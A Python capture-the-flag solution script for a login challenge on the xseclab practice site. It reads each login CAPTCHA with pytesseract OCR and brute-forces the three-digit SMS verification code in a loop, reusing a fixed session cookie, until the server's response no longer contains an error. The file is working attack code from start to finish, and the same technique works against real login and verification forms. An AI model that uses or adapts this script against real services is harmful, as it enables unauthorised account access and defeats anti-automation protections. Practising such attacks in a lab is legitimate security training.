#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests  #调用url、cookie操作 文件操作的库
import sys
import time
from pytesseract import *
from PIL import Image
#识别验证码
def vcode(pic_url,cookies):
    "python验证码识别函数"
    r = requests.get(pic_url, cookies=cookies, timeout=10)
    with open('vcode.png', 'wb') as pic:
        pic.write(r.content)
    image=Image.open('vcode.png')
    im = image_to_string(image)
    #print im
    im = im.replace(' ', '')
    if im.isdigit() and len(im)==4:
        return im
    else:
        return vcode(pic_url,cookies)
#请求短信验证
def req_vode():
    cookies = {'PHPSESSID':'bdea14ebdeef921503e47536acd53c84'} 
    payload = {'username': '13388886666', 'mobi_code': '100','user_code':'9386','Login':'submit'}
    #headers = {'user-agent': 'my-app/0.0.1'}
    picurl='http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'
    url="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php"
    #filename = u"D:/Users/flag.txt"
    #fp = open(filename, 'a')
    for i in range(100,999): 
        code1=vcode(picurl,cookies)
        #time.sleep(0.01)
        payload['user_code']=code1
        payload['mobi_code']='%d'%(i)
        wp = requests.post(url, data=payload,cookies=cookies, timeout=10)  #params=payload get,headers=headers
        #print(wp.text)
        text=wp.content
        #text=text[2:len(text)]
        #print 'length:%d'%(len(text))
        #fp.write(text.encode('utf-8'))
        responsetxt = text.decode('utf-8')
        if 'error' not in responsetxt:
            print ('The correct code is：', code1,responsetxt)
            break
        else:
            print ('tring code:', i, code1,responsetxt)
    print("get flag success")
req_vode()